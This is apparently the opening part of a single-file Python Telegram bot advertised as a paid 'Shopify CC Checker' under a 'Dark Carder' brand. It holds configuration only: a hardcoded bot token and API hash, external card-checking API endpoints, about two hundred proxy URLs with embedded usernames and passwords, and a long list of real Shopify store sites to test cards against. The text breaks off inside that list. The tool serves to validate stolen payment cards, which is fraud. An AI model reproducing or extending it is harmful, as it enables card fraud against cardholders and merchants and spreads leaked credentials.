# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚡⏤‌‌‌𝘿𝘼𝙍𝙆 𝘾@𝙍𝘿𝙀𝙍 👑
# Ultra Premium Shopify CC Checker — SINGLE FILE
# Owner: @DarkCarder05 | ID: 5807965902
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#
# INSTALL (once):
#   pip install aiogram aiohttp aiosqlite
#
# RUN:
#   1. Paste BOT_TOKEN below
#   2. python DarkCarder_Single.py
#
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import asyncio
import logging
import time
import json
import re
import random
from datetime import datetime
from typing import Optional, Dict, Any, List

try:
    from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.filters import Command
    from aiogram.client.default import DefaultBotProperties
    from aiogram.enums import ParseMode
    from aiogram.client.session.aiohttp import AiohttpSession
except ImportError:
    print("=" * 50)
    print("  aiogram missing!")
    print("  Run:  pip install aiogram aiohttp aiosqlite")
    print("=" * 50)
    raise SystemExit(1)

import aiohttp
import aiosqlite

# ═══════════════════════════════════════════════════════
# CONFIG — EDIT TOKEN ONLY
# ═══════════════════════════════════════════════════════
BOT_TOKEN = "8766173350:AAF8uSdsttx02Qk2o2gyfFI40gStsFjQEss"

API_ID = 38807471
API_HASH = "9bbfb9efe1a47596cf7f1b20017f5dc6"

OWNER_ID = 5541778617
OWNER_USERNAME = "@Poriot_ke"
OWNER_NAME = "👑⏤‌‌‌@𝙋𝙊𝙍𝙄𝙊𝙏_𝙆𝙀 👑"

CHANNEL_LINK = "https://t.me/nativecodes"
GROUP_LINK = "https://t.me/ShopifyChkUpdates"
CHANNEL_ID =-1003732235670
GROUP_ID =-1004409181577
HIT_LOGS_ID = -1004409181577

DEFAULT_APIS = [
    "https://noobs.cards/shopii",
    "https://afuonax-production-f32d.up.railway.app/shopify",
    "https://afuonax-production.up.railway.app/shopify",
]

PLANS = {
    "core":  {"days": 7,  "price": 5,  "name": "𝗖𝗢𝗥𝗘"},
    "elite": {"days": 15, "price": 7,  "name": "𝗘𝗟𝗜𝗧𝗘"},
    "root":  {"days": 30, "price": 15, "name": "𝗥𝗢𝗢𝗧"},
}

DB_PATH = "darkcarder.db"

# ═══════════════════════════════════════════════════════
# EMBEDDED PROXIES + SITES (big lists)
# ═══════════════════════════════════════════════════════
PROXIES = [
    'http://reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px591801.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px022507.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px410701.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px051703.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px040706.pointtoserver.com:10780',
    'http://purevpn0s7525859:zs1sexmo902s@px023005.pointtoserver.com:10780',
    'http://QqhNXKEJ9epDFXX:TP413jc3FXJicv3@82.41.250.152:44561',
    'http://Cj2TleS7iNbayFX:AMLC2BIk5dPdt71@82.41.250.108:45577',
    'http://RO4KywFTZkwQWHh:wPoYp7e3HLtOIFz@92.113.166.34:47445',
    'http://reseller3270s320237:7Grp9Gki@px420602.pointtoserver.com:10780',
    'http://IcxgsaM7NqC2uYW:lUuY5npx5PcvivZ@198.143.13.50:44341',
    'http://h1MYVf67RjGhReP:LDAhLa8HH9fAleJ@66.128.193.176:49829',
    'http://3DrTcOPMp8NuBNw:s45dEHgaDE9Hh6n@66.128.192.82:45474',
    'http://TRTek13rRVIjhcd:NBltoM3JIu3bm04@66.128.195.252:45879',
    'http://SsFpWYwBwdktxXu:CrGdIeDgfBf1G4w@205.196.9.234:45689',
    'http://yrSufhDS0vJ8JlR:KdvQNsefoJRmNNR@206.251.201.197:48219',
    'http://i9tCkImQbB9nXA6:niZY5wGnSMXVuV7@206.251.201.194:45283',
    'http://BPJr0d7aZxhnkcO:L2qQHSMyxo3CwKn@207.135.204.150:49135',
    'http://kQcC1ZcIoekwrY9:5IT9JCyFPL7oPBy@205.196.9.68:45605',
    'http://IvGBjSXVr8M5xs7:Ui3KovTpAPc8CvU@205.196.9.165:42559',
    'http://pKFEs5nwf9pOFPd:18gLNtOwzdLi2nz@205.196.10.97:49533',
    'http://reseller3270s320237:7Grp9Gki@px032004.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px031901.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px1260303.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px121102.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px270401.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px241102.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px591801.pointtoserver.com:10780',
    'http://purevpn0s7418668:hkoerprqpmtz@px023005.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px022409.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px051003.pointtoserver.com:10780',
    'http://purevpn0s7418668:hkoerprqpmtz@px040706.pointtoserver.com:10780',
    'http://purevpn0s7418668:hkoerprqpmtz@px591801.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px023005.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px022507.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px022409.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px420602.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px420602.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px420602.pointtoserver.com:10780',
    'http://purevpn0s7418668:hkoerprqpmtz@px440401.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px121101.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px270401.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px270401.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px013304.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px152201.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px152201.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px400408.pointtoserver.com:10780',
    'http://purevpn0s7418668:hkoerprqpmtz@px380101.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px400408.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px040706.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px410701.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px400408.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px380101.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px380101.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px591801.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px121101.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px440401.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px241104.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px013304.pointtoserver.com:10780',
    'http://purevpn0s9531833:0cx55e7k@px014004.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px023005.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px051003.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780',
    'http://purevpn0s7418668:hkoerprqpmtz@px040805.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px043006.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px410701.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px015601.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px013401.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px013302.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px014004.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px013403.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px019603.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px591801.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px022409.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px022408.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px420602.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px031901.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px013301.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px051703.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px040706.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px400501.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px520401.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px013304.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px015601.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px380101.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px400408.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px023005.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px1260303.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px241104.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px152201.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px241102.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px022408.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px013301.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px019603.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px032002.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px400501.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px380101.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px520401.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px040805.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px121102.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px121101.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px013304.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px440401.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px470108.pointtoserver.com:10780',
    'http://purevpn0s13289443:4C5BS}S8pW&YK8@px022505.pointtoserver.com:10780',
    'http://purevpn0s14009653:yLMFg4SL52Uua7@px460101.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px400408.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px016104.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px121001.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px180801.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px241104.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px152201.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px023005.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px022507.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px051003.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px591801.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px043006.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px022409.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px410701.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px022408.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px051703.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px040706.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px420602.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px031901.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px400501.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px380101.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px520401.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px121102.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px121101.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px440401.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px180801.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px016104.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px013304.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px121001.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px040805.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px400408.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px1260303.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px270401.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px241104.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px152201.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px241102.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px019603.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px015601.pointtoserver.com:10780',
    'http://purevpn0s9889572:jx5q0xao@px014004.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px023005.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px051003.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px022507.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px043006.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px410701.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px591801.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px022409.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px022408.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px420602.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px031901.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px051703.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px040706.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px380101.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px400501.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px520401.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px040805.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px121102.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px121101.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px015601.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px014004.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px400408.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px440401.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px016104.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px121001.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px180801.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px270401.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px023005.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px022507.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px043006.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px051003.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px410701.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px152201.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px1260303.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px032004.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px241102.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px241104.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px013304.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px013301.pointtoserver.com:10780',
    'http://purevpn0s13933117:&%Bl}H6HMXvJ@px019603.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px591801.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px022409.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px022408.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px420602.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px031901.pointtoserver.com:10780',
    'http://purevpn0s13811607:Wb%lj!uEc5&a@px015601.pointtoserver.com:10780',
    'http://163.223.78.107:8080',
    'http://38.7.195.52:999',
    'http://95.211.174.135:3128',
    'http://34.43.46.91:443',
    'http://34.43.46.91:80',
    'http://103.106.112.166:1234',
    'http://47.74.46.81:6379',
    'http://153.72.68.0:8080',
    'http://8.219.97.248:80',
    'http://120.232.115.170:17981',
    'http://103.82.20.76:8080',
    'http://117.236.124.166:3128',
    'http://164.52.11.194:18080',
    'http://14.225.240.23:8562',
    'http://37.187.109.70:10111',
    'http://8.209.255.13:3128',
    'http://37.59.125.131:8888',
    'http://103.237.102.191:11111',
    'http://144.24.111.128:3129',
    'http://176.111.37.5:39811',
    'http://95.3.69.222:8080',
    'http://47.91.121.127:80',
    'http://8.211.200.183:1080',
    'http://8.211.200.183:100',
    'http://8.212.165.164:5000',
    'http://8.212.151.166:4100',
    'http://45.174.108.141:999',
    'http://176.111.37.216:39811',
    'http://114.236.137.41:21000',
    'http://116.196.150.180:17981',
    'http://119.188.131.55:17981',
    'http://122.246.3.12:17981',
    'http://190.12.150.244:999',
    'http://58.254.153.146:17981',
    'http://203.2.151.21:8080',
    'http://purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780',
    'http://purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px591201.pointtoserver.com:10780',
    'http://reseller3270s320237:7Grp9Gki@px591203.pointtoserver.com:10780'
]

SITES = [
    'https://kidsracingdev.myshopify.com',
    'https://2-peas-and-a-dog.myshopify.com',
    'https://card-shellz.myshopify.com',
    'https://quietkat.com',
    'https://student-leadership-university.myshopify.com',
    'https://xudesessencedesigns.myshopify.com',
    'https://imaginediy.myshopify.com',
    'https://rose-farmers-t-mobile-tuesdays.myshopify.com',
    'https://gerbingheated.myshopify.com',
    'https://fastbundledemo.myshopify.com',
    'https://theboujeewholesaler.myshopify.com',
    'https://sunnies-shades-htx.myshopify.com',
    'https://digitaldocinc.myshopify.com',
    'https://dj-russticals.myshopify.com',
    'https://sassy-tabby-supplies.myshopify.com',
    'https://young-god-records-2.myshopify.com',
    'https://omg-olive-oil.myshopify.com',
    'https://jackery.myshopify.com',
    'https://lliked.com',
    'https://queens-college-campus-store.myshopify.com',
    'https://angelusdirect.com',
    'https://msfjkx-xs.myshopify.com',
    'https://paperzen.myshopify.com',
    'https://emax-us.myshopify.com',
    'https://bad-omens-store.myshopify.com',
    'https://bb-king-museum.myshopify.com',
    'https://mysuds2go.com',
    'https://gehbbt-vn.myshopify.com',
    'https://chick-boss.myshopify.com',
    'https://revitin.myshopify.com',
    'https://formufit-wholesale.myshopify.com',
    'https://distributorsofurbanspiritbiblesbooks-gifts.myshopify.com',
    'https://alley-cat-allies.myshopify.com',
    'https://vosgeschocolate.myshopify.com',
    'https://pawstruck.myshopify.com',
    'https://play-pits.myshopify.com',
    'https://dbs838.myshopify.com',
    'https://badkneests.com',
    'https://danaateoatmeal.com',
    'https://canningcrafts.myshopify.com',
    'https://case-co-3486.myshopify.com',
    'https://custommadebetter.com',
    'https://expressionmed.com',
    'https://c-c-designs-rubber-stamps.myshopify.com',
    'https://miro-france.com',
    'https://nomad-lane.myshopify.com',
    'https://whistleandivy.myshopify.com',
    'https://timeouttrailersinc.com',
    'https://tjenaeinc.myshopify.com',
    'https://hrtseeker.myshopify.com',
    'https://ethos-handcrafted-car-care.myshopify.com',
    'https://cdngirlcashstuffer.myshopify.com',
    'https://apollo-tools.myshopify.com',
    'https://discountgearxpress-3.myshopify.com',
    'https://ccdesigncreations.myshopify.com',
    'https://a1bakerysupplies.myshopify.com',
    'https://lauriekentdesigns.com',
    'https://lion-brand-yarn.myshopify.com',
    'https://designer-dirt.myshopify.com',
    'https://the-butterfly-pig-dev.myshopify.com',
    'https://esl-posters.myshopify.com',
    'https://myfavouritethings-knitwear.com',
    'https://the-historic-thayer-hotel-at-west-point.myshopify.com',
    'https://glorillastore.myshopify.com',
    'https://boxcomponents.myshopify.com',
    'https://store.pillitteri.com',
    'https://annalisathomas.myshopify.com',
    'https://rebeljune.com',
    'https://tileboom.myshopify.com',
    'https://e55c6d-3.myshopify.com',
    'https://volvik.com',
    'https://insipidphenom.myshopify.com',
    'https://change-please-foundation.myshopify.com',
    'https://jims-machineworkx.myshopify.com',
    'https://luxedealsbymaria.myshopify.com',
    'https://nohmaleather.com',
    'https://hulmara.com',
    'https://downtownkingston.myshopify.com',
    'https://jetskiparts.myshopify.com',
    'https://perfectfoods.myshopify.com',
    'https://nano-b.myshopify.com',
    'https://vicegripgarage.com',
    'https://wccistore.myshopify.com',
    'https://kitchenhackshack.myshopify.com',
    'https://cakeink.myshopify.com',
    'https://doubletopdarts.myshopify.com',
    'https://hpathx-d0.myshopify.com',
    'https://culturelle.myshopify.com',
    'https://littleladoo.myshopify.com',
    'https://janies-mill.myshopify.com',
    'https://duitsmans-wholesale-llc.myshopify.com',
    'https://beautbeautyco.com',
    'https://j-l-naturals.myshopify.com',
    'https://baby-munchables.myshopify.com',
    'https://e028f0.myshopify.com',
    'https://235394-99.myshopify.com',
    'https://lace-by-jennywu.myshopify.com',
    'https://politicalpuffs.com',
    'https://beyond-the-gift-shop.myshopify.com',
    'https://talentintelligencecollective.myshopify.com',
    'https://hyperenergybar.myshopify.com',
    'https://moonlightjeweldolls.myshopify.com',
    'https://formfunctionform.myshopify.com',
    'https://badkneests.myshopify.com',
    'https://zinka-shop.myshopify.com',
    'https://fitleticsports.myshopify.com',
    'https://roundlab.com',
    'https://musicworksmag.myshopify.com',
    'https://fastracer.com',
    'https://c-c-riderseats.myshopify.com',
    'https://hipsterrow.com',
    'https://dressupstudioshop.com',
    'https://the-many-are-here.myshopify.com',
    'https://matebrush.myshopify.com',
    'https://5a655b-27.myshopify.com',
    'https://playchessup.com',
    'https://archer-and-olive.myshopify.com',
    'https://beaconhillhomeandschool.myshopify.com',
    'https://crazy-pinz.myshopify.com',
    'https://artstarphilly.myshopify.com',
    'https://fluid-freeride.myshopify.com',
    'https://gowesty.myshopify.com',
    'https://nplusonemag.myshopify.com',
    'https://anchoredsouldesigns.com',
    'https://brunswick-iga-bakery.myshopify.com',
    'https://artofmanliness.myshopify.com',
    'https://creoclay.myshopify.com',
    'https://nio-teas.myshopify.com',
    'https://bearlyart.myshopify.com',
    'https://deziskin.com',
    'https://prymal-coffee-creamer.myshopify.com',
    'https://fireflychocolate.myshopify.com',
    'https://da-goodie-shop.myshopify.com',
    'https://circuitscribe.com',
    'https://gohypo.myshopify.com',
    'https://aglitterylifeplans.com',
    'https://led-lights-d.myshopify.com',
    'https://yaya-marias.myshopify.com',
    'https://shelbydesigning.myshopify.com',
    'https://green-mountain-gravel.myshopify.com',
    'https://nixbiosensors.com',
    'https://camolots.myshopify.com',
    'https://giraffetoolsfr.myshopify.com',
    'https://beijaflornaturals.myshopify.com',
    'https://hellocarepod.myshopify.com',
    'https://exauoliveoil.com',
    'https://morning-brew-merchandise.myshopify.com',
    'https://1brewatatime.myshopify.com',
    'https://thesoilking.com',
    'https://affcf2.myshopify.com',
    'https://penske-shocks.myshopify.com',
    'https://eric-church-us.myshopify.com',
    'https://uncle-jimmy-products.myshopify.com',
    'https://meriwetherfarms.com',
    'https://livsn.myshopify.com',
    'https://shop.amandatrumpower.com',
    'https://kikizcosmeticz.myshopify.com',
    'https://domani-8396.myshopify.com',
    'https://tmrw-project.myshopify.com',
    'https://store.minisforum.com',
    'https://glowhigh.com',
    'https://houseofuk.myshopify.com',
    'https://montessorikiwi.myshopify.com',
    'https://lords-coffee.myshopify.com',
    'https://hellobobbie.myshopify.com',
    'https://hobnobmarket.myshopify.com',
    'https://craftbully.myshopify.com',
    'https://live-elemental.myshopify.com',
    'https://gulliverswhisky.com',
    'https://mnacardz.com',
    'https://i-got-bugs.myshopify.com',
    'https://smallbutkindamighty.com',
    'https://multitasky.myshopify.com',
    'https://creativecakery.myshopify.com',
    'https://kneerover.myshopify.com',
    'https://magic-city-wellness-expo.myshopify.com',
    'https://matt-naughtin.myshopify.com',
    'https://cut-the-mustard-cafe.myshopify.com',
    'https://inside-stores-2.myshopify.com',
    'https://ekithub.myshopify.com',
    'https://tecaccessories.myshopify.com',
    'https://jessica-foster-confections.myshopify.com',
    'https://cristinarosecrafts.myshopify.com',
    'https://hello-mud-daddy.myshopify.com',
    'https://flyingcox.myshopify.com',
    'https://livingdnasg.myshopify.com',
    'https://jana-reinhardt.myshopify.com',
    'https://evogimbals.myshopify.com',
    'https://american-baitworks-dev.myshopify.com',
    'https://srtest-5.myshopify.com',
    'https://meganwoods.myshopify.com',
    'https://holysticfoodiekitchen.myshopify.com',
    'https://broke-student-store.myshopify.com',
    'https://theheritageforge.com',
    'https://mirrormatellc.myshopify.com',
    'https://qualiaware.myshopify.com',
    'https://love-and-lion.myshopify.com',
    'https://outlashwear.com',
    'https://minimalgear.com',
    'https://jtwearspf.myshopify.com',
    'https://mountechusa.com',
    'https://zee-s-boutique-amazing-drops.myshopify.com',
    'https://store.vermontpublic.org',
    'https://free-the-ocean.myshopify.com',
    'https://tribal-expression-jewelry.myshopify.com',
    'https://apurposefulbudget.myshopify.com',
    'https://butterflygigi.com',
    'https://gb-codexlabs.myshopify.com',
    'https://airdogusa.myshopify.com',
    'https://eco-cheeks.myshopify.com',
    'https://just-patterns.com',
    'https://next-stage-press.myshopify.com',
    'https://promixxusa.myshopify.com',
    'https://the-citizenry.com',
    'https://flourishingmama.myshopify.com',
    'https://mombeach.myshopify.com',
    'https://coinludens.myshopify.com',
    'https://dylplanner.com',
    'https://ritual-zero-proof.myshopify.com',
    'https://lilixir.myshopify.com',
    'https://cotton-clouds-inc.myshopify.com',
    'https://imaginevinyl.com.au',
    'https://freakmount.myshopify.com',
    'https://vegherb.myshopify.com',
    'https://1776-industries-llc.myshopify.com',
    'https://shop-clydesrestaurantgroup-com.myshopify.com',
    'https://lacordathreads.myshopify.com',
    'https://essential-wipes.myshopify.com',
    'https://angelasimeone.com',
    'https://warriorswayjerky.com',
    'https://firdosmarket.com',
    'https://zurkdecals.myshopify.com',
    'https://dipaliciousnails.com',
    'https://greater-good-2.myshopify.com',
    'https://cf64.myshopify.com',
    'https://sketchboardpro.myshopify.com',
    'https://crystalskeebs.myshopify.com',
    'https://betterinblueco.myshopify.com',
    'https://uminono.com.au',
